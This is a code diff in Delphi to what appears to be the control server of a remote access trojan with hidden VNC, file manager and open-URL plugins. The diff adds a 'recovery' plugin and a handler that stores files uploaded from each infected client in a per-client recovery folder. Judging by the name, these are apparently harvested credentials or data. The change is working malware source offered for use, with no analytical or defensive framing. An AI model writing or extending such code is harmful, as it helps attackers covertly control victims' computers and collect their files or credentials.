@@ -26,6 +26,7 @@ const
   OPEN_URL_PLUGIN_ID          = 'OpenURLPlugin';
   FILE_MANAGER_PLUGIN_ID      = 'FileManagerPlugin';
   HIDDEN_VNC_PLUGIN_ID        = 'HiddenVNCPlugin';
+  RECOVERY_PLUGIN_ID          = 'RecoveryPlugin';
 
   MAX_JSON_BUFFER_SIZE      = 128 * 1024 * 1024;
   PACKET_TYPE_JSON          = $01;
@@ -34,6 +35,7 @@ const
   PACKET_TYPE_FILE_UPLOAD   = $04;
   PACKET_TYPE_FILE_DOWNLOAD = $05;
   PACKET_TYPE_HVNC_FRAME    = $06;
+  PACKET_TYPE_RECOVERY_FILE = $07;
 
   MONITOR_FRAME_FORMAT_JPEG = 1;
   HVNC_FRAME_FORMAT_JPEG_FULL  = 1;
@@ -144,6 +146,7 @@ type
     procedure ProcessHVNCBinaryFrame(aLine: TncLine; const Payload: TBytes);
     procedure ProcessFileManagerBinaryPacket(aLine: TncLine;
       PacketType: Byte; const Payload: TBytes);
+    procedure ProcessRecoveryBinaryPacket(aLine: TncLine; const Payload: TBytes);
 
     procedure OnHeartbeat(Sender: TObject);
     procedure DisconnectLine(aLine: TncLine);
@@ -176,6 +179,7 @@ type
     procedure SendOpenURLPlugin(aLine: TncLine);
     procedure SendFileManagerPlugin(aLine: TncLine);
     procedure SendHiddenVNCPlugin(aLine: TncLine);
+    procedure SendRecoveryPlugin(aLine: TncLine);
 
     function  TryGetClientInfo(aLine: TncLine; out Info: TClientInfo): Boolean;
     function  IsActive   : Boolean;
@@ -988,6 +992,9 @@ begin SendPlugin(aLine, FILE_MANAGER_PLUGIN_ID); end;
 procedure TServerManager.SendHiddenVNCPlugin(aLine: TncLine);
 begin SendPlugin(aLine, HIDDEN_VNC_PLUGIN_ID); end;
 
+procedure TServerManager.SendRecoveryPlugin(aLine: TncLine);
+begin SendPlugin(aLine, RECOVERY_PLUGIN_ID); end;
+
 { ---------------------------------------------------------------------- }
 {  Server Events                                                           }
 { ---------------------------------------------------------------------- }
@@ -1205,7 +1212,9 @@ begin
       else if BP.PacketType = PACKET_TYPE_HVNC_FRAME then
         ProcessHVNCBinaryFrame(aLine, BP.Payload)
       else if BP.PacketType = PACKET_TYPE_FILE_DOWNLOAD then
-        ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload);
+        ProcessFileManagerBinaryPacket(aLine, BP.PacketType, BP.Payload)
+      else if BP.PacketType = PACKET_TYPE_RECOVERY_FILE then
+        ProcessRecoveryBinaryPacket(aLine, BP.Payload);
     end;
   finally
     BinaryPackets.Free;
@@ -1285,6 +1294,82 @@ begin
   begin
     FileManagerForm.HandleBinaryPacket(CapturedType, CapturedPayload);
   end);
+end;
+
+procedure TServerManager.ProcessRecoveryBinaryPacket(aLine: TncLine; const Payload: TBytes);
+var
+  Info: TClientInfo;
+  ClientID: string;
+  NameLen: Integer;
+  FileName: string;
+  FileDataLen: Integer;
+  SavePath: string;
+  FullFilePath: string;
+  FileDir: string;
+begin
+  if not TryGetClientInfo(aLine, Info) then Exit;
+  ClientID := Info.ID;
+
+  if Length(Payload) < 4 then Exit;
+  Move(Payload[0], NameLen, 4);
+
+  if (NameLen <= 0) or (NameLen > 2048) or (Length(Payload) < (4 + NameLen)) then Exit;
+
+  FileName := TEncoding.UTF8.GetString(Payload, 4, NameLen);
+
+  // Security Sanitization: Prevent Directory Traversal
+  FileName := FileName.Replace('/', System.IOUtils.TPath.DirectorySeparatorChar);
+  FileName := FileName.Replace('\', System.IOUtils.TPath.DirectorySeparatorChar);
+
+  // Remove drive letters and leading separators
+  if (Length(FileName) >= 2) and (FileName[2] = ':') then
+    Delete(FileName, 1, 2);
+
+  while (Length(FileName) > 0) and (FileName[1] = System.IOUtils.TPath.DirectorySeparatorChar) do
+    Delete(FileName, 1, 1);
+
+  // Remove ".." components
+  var PathParts := FileName.Split([System.IOUtils.TPath.DirectorySeparatorChar]);
+  var CleanPath := '';
+  for var Part in PathParts do
+  begin
+    if (Part = '') or (Part = '..') or (Part = '.') then Continue;
+    if CleanPath <> '' then CleanPath := CleanPath + System.IOUtils.TPath.DirectorySeparatorChar;
+    CleanPath := CleanPath + Part;
+  end;
+  FileName := CleanPath;
+
+  if FileName = '' then Exit;
+
+  FileDataLen := Length(Payload) - 4 - NameLen;
+  SavePath := System.IOUtils.TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
+  SavePath := System.IOUtils.TPath.Combine(SavePath, ClientID);
+  SavePath := System.IOUtils.TPath.Combine(SavePath, 'recovery');
+
+  if not System.IOUtils.TDirectory.Exists(SavePath) then
+    System.IOUtils.TDirectory.CreateDirectory(SavePath);
+
+  FullFilePath := System.IOUtils.TPath.Combine(SavePath, FileName);
+
+  // Double check that FullFilePath is actually inside SavePath
+  if not FullFilePath.StartsWith(SavePath, True) then Exit;
+
+  FileDir := System.IOUtils.TPath.GetDirectoryName(FullFilePath);
+  if not System.IOUtils.TDirectory.Exists(FileDir) then
+    System.IOUtils.TDirectory.CreateDirectory(FileDir);
+
+  TThread.CreateAnonymousThread(
+    procedure
+    begin
+      var AMS := TMemoryStream.Create;
+      try
+        if FileDataLen > 0 then
+          AMS.WriteBuffer(Payload[4 + NameLen], FileDataLen);
+        AMS.SaveToFile(FullFilePath);
+      finally
+        AMS.Free;
+      end;
+    end).Start;
 end;
 
 { ---------------------------------------------------------------------- }
@@ -1431,6 +1516,7 @@ begin
         else if SameText(PluginID, OPEN_URL_PLUGIN_ID)          then SendOpenURLPlugin(aLine)
         else if SameText(PluginID, FILE_MANAGER_PLUGIN_ID)      then SendFileManagerPlugin(aLine)
         else if SameText(PluginID, HIDDEN_VNC_PLUGIN_ID)        then SendHiddenVNCPlugin(aLine)
+        else if SameText(PluginID, RECOVERY_PLUGIN_ID)          then SendRecoveryPlugin(aLine)
         else SendPlugin(aLine, PluginID);
       end;
       Exit;
@@ -1614,5 +1700,3 @@ begin
 end;
 
 end.
-
-
